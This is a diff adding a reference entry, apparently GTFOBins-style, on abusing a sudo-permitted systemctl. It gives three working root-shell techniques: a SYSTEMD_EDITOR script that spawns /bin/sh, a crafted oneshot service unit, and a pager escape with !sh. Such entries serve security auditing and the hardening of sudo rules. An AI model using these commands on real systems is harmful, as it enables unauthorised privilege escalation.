@@ -1,0 +1,20 @@
+***** Sudo *****
+If the binary is allowed to run as superuser by sudo, it does not drop the
+elevated privileges and may be used to access the file system, escalate or
+maintain privileged access.
+    * TF=$(mktemp)
+      echo /bin/sh >$TF
+      chmod +x $TF
+      sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice
+    * TF=$(mktemp).service
+      echo '[Service]
+      Type=oneshot
+      ExecStart=/bin/sh -c "id > /tmp/output"
+      [Install]
+      WantedBy=multi-user.target' > $TF
+      sudo systemctl link $TF
+      sudo systemctl enable --now $TF
+    * This invokes the default pager, which is likely to be less, other
+      functions may apply.
+      sudo systemctl
+      !sh
